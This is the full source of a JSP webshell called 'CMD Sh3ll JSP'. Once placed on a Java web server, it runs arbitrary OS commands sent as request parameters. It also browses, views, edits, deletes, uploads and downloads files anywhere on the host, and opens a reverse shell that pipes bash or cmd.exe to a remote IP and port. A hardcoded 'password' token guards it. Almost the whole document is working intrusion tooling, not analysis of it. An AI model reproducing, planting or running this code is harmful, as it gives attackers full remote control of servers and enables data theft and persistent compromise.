<!--
	Webshell to server web java.
		
	Tiago Martins (tiago.tsmweb@gmail.com)
-->

<%@ page import="java.util.*, java.io.*, javax.servlet.*, javax.servlet.http.*, javax.servlet.annotation.*"%>
<%@ page import="java.text.*"%>
<%@ page import="java.net.*"%>
<%@ page import="java.util.zip.*"%>

<%@ page language="java" contentType="text/html; charset=ISO-8859-1" %>

<%
if (request.getParameter("token") != null && request.getParameter("token").equals("password")) {
	session.setAttribute("auth", "s");
}
if (session.getAttribute("auth") == null || !((String)session.getAttribute("auth")).equals("s")) {
	out.close();
}
%>
<html>
<head>
	<title>=<CMD Sh3ll JSP>=</title>
	<style type="text/css">
		* {
			margin: 0;
			padding: 0;
		}
		body {
			background-color: #333;
			color: #ddd;
			font-size: 10pt;
		}
		a:link {text-decoration: none;color: #3B83BD}
		a:active {text-decoration: none;}
		a:visited {text-decoration: none;color: #3B83BD}
		a:hover {text-decoration: underline;color: #3B83BD}
		#main {
			margin: 5px;
			padding: 5px;
			border: 1px dashed #24E711;
		}
		#info {
			border-bottom: 1px dashed #24E711;
		}
		#info b {
			color: #24E711;
			font-size: 10pt;
		}
		#info h1 {
			text-align: center;
			font-size: 20pt;
			padding: 10px;
			color: #24E711; 
			border-bottom: 1px dashed #24E711;
		}
		#cmd {
			border: 2px solid #24E711;
			overflow: auto;
			height: 300px;
			background-color: #000;
			color: #eee;
		}
		#file .table_files {
			font-size: 12pt;
			width: 100%;
			border: 1px solid #24E711;
			background-color: #222;
		}
		#file .table_files td,
		#file .table_files th {
			border-bottom: 1px solid #24E711;
			padding: 3px;
			margin-right: 2px;
			font-size: 10pt;
			text-align: left;
		}
		#file .upload {
			font-size: 12pt;
			width: 100%;
			border: 1px solid #24E711;
			text-align: left;
		}
		.row_selected {
			background-color: #333;
		}
		.row {
			background-color: #222;
		}
		.menu {
			float: left;
			width: 100%;
			text-align: left;
			border-bottom: 1px dashed #24E711;
		}
		.menu span {
			display: block;
			float: left;
			padding: 3px;
			background-color: #000;
			font-size: 12pt;
			margin: 2px 1px;
			box-shadow: 1px 1px 1px #555;
		    -webkit-box-shadow: 1px 1px 1px #555;
		    -moz-box-shadow: 1px 1px 1px #555;
		}
		.menu span a:link {text-decoration: none;color: #24E711}
		.menu span a:active {text-decoration: none;}
		.menu span a:visited {text-decoration: none;color: #24E711}
		.menu span a:hover {text-decoration: underline;color: #24E711}
		.url_inf, 
		.hd_inf	{
			font-size: 12pt;
			padding: 3px;
			margin: 5px 0;
			clear: both;
		}
		.url_inf {
			color: #FF7514;
		}
		.view_inf,
		.edit_panel	{
			clear: both;
			background-color: #000;
			color: #fff;
			border: 1px solid #24E711;
			height: 250px;
			overflow: auto;
			margin: 5px 0;
		}
		.edit_panel textarea {
			height: 90%;
			width: 100%;
			background-color: #000;
			color: #fff;
		}
		.reverse_shell td {
			font-size: 12pt;
			border: 1px solid #24E711;
			background-color: #222;
			padding: 3px;
		}	
	</style>
</head>
<body>
	<div id="main">
		<div id="info">
			<h1>=&lsaquo;CMD Sh3ll JSP&rsaquo;=</h1>
			<table border="0">
				<tr><td><b>Server IP</b></td><td><%=request.getLocalAddr()%></td></tr>
				<tr><td><b>Client IP</b></td><td><%=request.getRemoteAddr()%></td></tr>
				<tr><td><b>SO</b></td><td><%=System.getProperty("os.name")%> - v<%=System.getProperty("os.version")%> - <%=System.getProperty("os.arch")%></td></tr>
				<tr><td><b>VM</b></td><td><%=System.getProperty("java.runtime.name")%> - v<%=System.getProperty("java.vm.version")%></td></tr>
				<tr><td><b>USER:HOME</b></td><td><%=System.getProperty("user.name")%>:<%=System.getProperty("user.home")%></td></tr>
				<tr><td><b>PATH</b></td><td><%=request.getRealPath(request.getServletPath())%></td></tr>
			</table>
		</div>
		<div id="content">
			<div class="menu">
				<span><a href="?t=mf">Manager File</a></span>
				<span><a href="?t=sl">Shell</a></span>
				<span><a href="?t=rs">Reverse Shell</a></span>
				<span><a href="?t=ex">Exit</a></span>
			</div>
			<% 	
				boolean soWin = System.getProperty("os.name").toLowerCase().contains("win");
				String contentType = request.getContentType();
				String t = "mf";
				
				if (contentType != null)
					t = session.getAttribute("t") == null ? "mf" : (String)session.getAttribute("t");
				else {	
					t = request.getParameter("t") == null ? "mf" : request.getParameter("t");
					session.setAttribute("t", t);
				}
			
				if (t.equalsIgnoreCase("ex")) {
					session.setAttribute("auth", "n");
					response.sendRedirect(request.getRequestURL().toString());
				} 
				else if (t.equalsIgnoreCase("sl")) {
					out.print("<div style='margin: 5px; clear: both;'>");
					out.print("<form method='post'>");
					out.print("<input type='hidden' name='t' value='sl' />");
					out.print("$ <input type='text' name='c' id='c' size='60' />"); 
					out.print("<input type='submit' value='Go' />");
					out.print("</form>");
					out.print("</div>");	  
					out.print("<div id='cmd'>");	
					
					if (request.getParameter("c") != null) { 
						out.println("$ " + request.getParameter("c") + "<br />");
						out.println("<pre>");
						try {
							String command = soWin ? "cmd.exe /c "+request.getParameter("c") : request.getParameter("c");
							File pathCmd = new File(request.getRealPath(""));
							Process p = Runtime.getRuntime().exec(command, null, pathCmd);  
							p.waitFor();
							
							String lineError;
							BufferedReader error = new BufferedReader(new InputStreamReader(p.getErrorStream()));
							while((lineError = error.readLine()) != null){
								out.println(lineError);
							}
							error.close();
							
							String lineOut;
							BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));  
							while ((lineOut = input.readLine()) != null) {  
								out.println(lineOut);  
							}  					 
							input.close();
						} catch(Exception e) {
							out.println("<pre>"+String.format("Falha ao executar comando %s. Erro: %s", request.getParameter("c"), e.toString())+"</pre>");
						}
						out.println("</pre>");
					} 
					out.print("<script type='text/javascript'>document.getElementById('c').focus();</script>");
					out.print("</div>");	
				} 
				else if (t.equalsIgnoreCase("mf")) {
					String d = request.getRealPath("");
					
					if (contentType != null) {
						d = session.getAttribute("d") == null ? request.getRealPath("") : (String)session.getAttribute("d");
						
						if (contentType.indexOf("multipart/form-data") >= 0) {
							uploadFile(contentType, d, request);
						} else {
							saveEditFile(d, request);
						}
					} else {		
						d = request.getParameter("d") == null ? request.getRealPath("") : request.getParameter("d");
						session.setAttribute("d", d);
					}
				
					out.print("<div class='hd_inf'>");
					File[] entry = File.listRoots();
					for (File f : entry) {
						out.println("<a href='?t=mf&d="+f.getAbsolutePath()+"'>"+f.getAbsolutePath()+"</a>  | ");
					}
					out.print("</div>");
					out.print("<div class='url_inf'>"+d+"</div>");
					out.print("<div id='file'>");
					
					if (contentType == null) {
						if (request.getParameter("a") != null && request.getParameter("a").equalsIgnoreCase("delete")) {
							File file = new File(d+File.separatorChar+request.getParameter("f"));
							deleteFile(file);	
						} else if (request.getParameter("a") != null && request.getParameter("a").equalsIgnoreCase("view")) {
							String f = d+File.separatorChar+request.getParameter("f");
							BufferedReader br = new BufferedReader(new FileReader(f));  
							out.print("<div class='view_inf'>");
							out.print("<pre>");
							while(br.ready()){  
								String linha = br.readLine();	
								out.println(scapeHTML(linha));  
							}  
							br.close();
							out.print("</pre></div>");  
						} else if (request.getParameter("a") != null && request.getParameter("a").equalsIgnoreCase("edit")) {
							String f = d+File.separatorChar+request.getParameter("f");
							BufferedReader br = new BufferedReader(new FileReader(f));  
							out.print("<div class='edit_panel'>");
							out.print("<form method='post'>");
							out.print("<input type='hidden' name='t' value='mf' />");
							out.print("<input type='hidden' name='f' value='"+request.getParameter("f")+"' />");
							out.print("<textarea name='file_new'>");
							
							while(br.ready()){  
								String linha = br.readLine();	
								out.println(scapeHTML(linha));  
							}  
							
							br.close();
							out.print("</textarea>");
							out.print("<input type='submit' value='Save' /> </form>");
							out.print("</div>"); 	
						} else if (request.getParameter("a") != null && request.getParameter("a").equalsIgnoreCase("download")) {
							File file = new File(d+File.separatorChar+request.getParameter("f"));
							response.setContentType("application/octet-stream");  
							response.setHeader("Content-Disposition", "attachment; filename="+file.getName()+".zip");  
							createZip(response.getOutputStream(), file); 
						}
					}
		
					out.print("<table class='table_files' cellspacing='1' cellpadding='0'>");
					out.print("<th style='width: 55%;'>Name</th><th style='width: 10%;'>Size</th><th style='width: 15%;'>Date</th><th style='width: 20%;'>Action</th>");
					
					File dir = new File(d);
					if (dir.getParent() != null) {
						out.print("<tr onmouseover=\"this.className = 'row_selected';\" onMouseOut=\"this.className = 'row';\">");
						out.print("<td><a href='?t=mf&d="+URLEncoder.encode(dir.getParent(), "UTF-8")+"'>[..]</a></td><td></td><td></td><td></td></tr>");
					}
					SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					for (File f : dir.listFiles()) {
						out.println("<tr onmouseover=\"this.className = 'row_selected';\" onMouseOut=\"this.className = 'row';\">");
						
						if (f.isDirectory())
							out.print("<td style='color=#3B83BD;'><a href='?t=mf&d="+URLEncoder.encode(f.getAbsolutePath(), "UTF-8")+"'>"+f.getName()+"</a></td>");
						else
							out.print("<td>"+f.getName()+"</td>");
							
						out.print("<td>"+(f.isDirectory() ? "DIR" : convertFileSize(f.length()))+"</td>");
						out.print("<td>"+sdf.format(new Date(f.lastModified()))+"</td>");

						if (f.isDirectory())
							out.print("<td><a href='?t=mf&d="+URLEncoder.encode(f.getParent(), "UTF-8")+"&f="+URLEncoder.encode(f.getName(), "UTF-8")+"&a=delete'>Delete</a> | <a href='?t=mf&d="+URLEncoder.encode(f.getParent(), "UTF-8")+"&f="+URLEncoder.encode(f.getName(),"UTF-8")+"&a=download'>Download</a></td>");
						else
							out.print("<td><a href='?t=mf&d="+URLEncoder.encode(f.getParent(), "UTF-8")+"&f="+URLEncoder.encode(f.getName(), "UTF-8")+"&a=delete'>Delete</a> | <a href='?t=mf&d="+URLEncoder.encode(f.getParent(), "UTF-8")+"&f="+URLEncoder.encode(f.getName(), "UTF-8")+"&a=download'>Download</a> | <a href='?t=mf&d="+URLEncoder.encode(f.getParent(), "UTF-8")+"&f="+URLEncoder.encode(f.getName(), "UTF-8")+"&a=edit'>Edit<a> | <a href='?t=mf&d="+URLEncoder.encode(f.getParent(),"UTF-8")+"&f="+URLEncoder.encode(f.getName(), "UTF-8")+"&a=view'>View</a></td>");
						
						out.println("</tr>");
					}
					out.print("</table>");
					out.print("<form method='post' enctype='multipart/form-data'>");
					out.print("<table class='upload' border='0'><tr>");
					out.print("<td><label for='file'>Upload File:</label>");
					out.print("<input type='file' name='file' id='file' style='background-color: white; color: black; border: 1px solid #333;' />");
					out.print("<input type='submit' value='Upload' /></td>");
					out.print("</tr></table>");
					out.print("</form>");	
				} else if (t.equalsIgnoreCase("rs")) {
					out.print("<form method='post'>");
					out.print("<div style='text-align: center; width: 100%; clear: both;'>");
					out.print("<table class='reverse_shell'>");
					out.print("<tr><td>IP Address</td><td><input type='text' name='ipaddress' id='ipaddress' size=20></td></tr>");
					out.print("<tr><td>Port</td><td><input type='text' name='port' size=20></td>");
					out.print("<tr><td colspan='2' style='text-align: center;'><input type='submit' value='Connect'></td></tr>");
					out.print("</table></div></form>");
					out.print("<script type='text/javascript'>document.getElementById('ipaddress').focus();</script>");

					String ipAddress = request.getParameter("ipaddress");
					String ipPort = request.getParameter("port");
					if (ipAddress != null && ipPort != null) {
						Socket sock = null;
						try {
							sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
							Runtime rt = Runtime.getRuntime();
							Process proc = rt.exec(soWin ? "cmd.exe" : "/bin/bash");
							StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());
							StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());
							StreamConnector errorConnector = new StreamConnector(proc.getErrorStream(), sock.getOutputStream());
							outputConnector.start();
							inputConnector.start();
							errorConnector.start();
						} catch(Exception e){}
					}
				}
			%>
		</div>
		<div style="clear: both"></div>
	</div>
</body>
</html>
<%!
static public void saveEditFile(String d, HttpServletRequest request) {
	String f = d+File.separatorChar+request.getParameter("f");
	try {
		String content = request.getParameter("file_new"); 		
		BufferedWriter buffWrite = new BufferedWriter(new FileWriter(f));
		buffWrite.write(content);
		buffWrite.close();
	} catch(Exception e) {}
}
%>
<%!
static public void createZip(OutputStream os, File file) throws IOException {   
    ZipOutputStream zos = null;  
    try {  
        zos = new ZipOutputStream(os);  
        String startPath = file.getParent();  
        addFileZip(zos, file, startPath);    
    } finally {  
      if (zos != null) {  
        try {  
          zos.close();  
        } catch(Exception e) {}  
      }  
    }  
} 
%>
<%!
static public void addFileZip(ZipOutputStream zos, File arq, String startPath) throws IOException {  
	int TAMANHO_BUFFER = 2048; 
    FileInputStream fis = null;  
    BufferedInputStream bis = null;  
    byte buffer[] = new byte[TAMANHO_BUFFER];  
    try {    
      if (arq.isDirectory()) {  
        File[] files = arq.listFiles();  
        for (int i = 0; i < files.length; i++) {  
          addFileZip(zos, files[i], startPath);  
        }  
		return;
      }  
      String pathEntryZip = null;  
      int idx = arq.getAbsolutePath().indexOf(startPath);  
      if (idx >= 0) {  
        pathEntryZip = arq.getAbsolutePath().substring(idx+startPath.length()+1);  
      }  
      ZipEntry entry = new ZipEntry(pathEntryZip);  
      zos.putNextEntry(entry);  
      zos.setMethod(ZipOutputStream.DEFLATED);  
      fis = new FileInputStream(arq);  
      bis = new BufferedInputStream(fis, TAMANHO_BUFFER);  
      int bytesRead = 0;  
      while ((bytesRead = bis.read(buffer, 0, TAMANHO_BUFFER)) != -1) {  
        zos.write(buffer, 0, bytesRead);  
      }   
    } finally {  
      if (bis != null) {  
        try {  
          bis.close();  
        } catch(Exception e) {}  
      }  
      if (fis != null) {  
        try {  
          fis.close();  
        } catch(Exception e) {}  
      }  
    } 
  }  
%>
<%!
static public boolean deleteFile(File file) {
	if (file.isDirectory()) {  
        String[] children = file.list(); 
        for (int i = 0; i < children.length; i++) {  
            boolean success = deleteFile(new File(file, children[i] ));
            if (!success) {  
                return false;  
            }  
        }  
    }  
	return file.delete();  
}
%>
<%!
static public void uploadFile(String contentType, String path, HttpServletRequest request) {
	try {
		DataInputStream in = new DataInputStream(request.getInputStream());
		int formDataLength = request.getContentLength();
		byte dataBytes[] = new byte[formDataLength];
		int byteRead = 0;
		int totalBytesRead = 0;
		while (totalBytesRead < formDataLength) {
			byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
			totalBytesRead += byteRead;
		}
		String file = new String(dataBytes);
		String saveFile = file.substring(file.indexOf("filename=\"") + 10);
		saveFile = saveFile.substring(0, saveFile.indexOf("\n"));
		saveFile = saveFile.substring(saveFile.lastIndexOf("\\") + 1,saveFile.indexOf("\""));
		int lastIndex = contentType.lastIndexOf("=");
		String boundary = contentType.substring(lastIndex + 1,contentType.length());
		int pos;
		pos = file.indexOf("filename=\"");
		pos = file.indexOf("\n", pos) + 1;
		pos = file.indexOf("\n", pos) + 1;
		pos = file.indexOf("\n", pos) + 1;
		int boundaryLocation = file.indexOf(boundary, pos) - 4;
		int startPos = ((file.substring(0, pos)).getBytes()).length;
		int endPos = ((file.substring(0, boundaryLocation)).getBytes()).length;
		FileOutputStream fileOut = new FileOutputStream(path+File.separatorChar+saveFile);
		fileOut.write(dataBytes, startPos, (endPos - startPos));
		fileOut.flush();
		fileOut.close();
	} catch(Exception e) {}
}
%>
<%!
static String convertFileSize(long size) {
	int divisor = 1;
	String unit = "bytes";
	if (size >= 1024 * 1024) {
		divisor = 1024 * 1024;
		unit = "MB";
	} else if (size >= 1024) {
		divisor = 1024;
		unit = "KB";
	}
	if (divisor == 1) 
		return size / divisor + " " + unit;
	String aftercomma = "" + 100 * (size % divisor) / divisor;
	if (aftercomma.length() == 1) 
		aftercomma = "0" + aftercomma;	
	return size / divisor + "." + aftercomma + " " + unit;
}
%>
<%!
static String scapeHTML(String content) {
	content = content.replaceAll(">", "&gt;");
	content = content.replaceAll("<", "&lt;");
	content = content.replaceAll("'", "&#039;");
	content = content.replaceAll("\"", "&#034;");
	return content;
}
%>
<%!
static class StreamConnector extends Thread {
	InputStream is;
	OutputStream os;

	StreamConnector(InputStream is, OutputStream os) {
		this.is = is;
		this.os = os;
	}

	public void run() {
		BufferedReader isr = null;
		BufferedWriter osw = null;
		try {
			isr = new BufferedReader(new InputStreamReader(is));
			osw = new BufferedWriter(new OutputStreamWriter(os));
			char buffer[] = new char[8192];
			int lenRead;
			while((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {
				osw.write(buffer, 0, lenRead);
				osw.flush();
			}
		} catch (Exception ioe){}
		try {
			if(isr != null) 
				isr.close();
			if(osw != null) 
				osw.close();
		} catch (Exception ioe){}
	}
}
%>
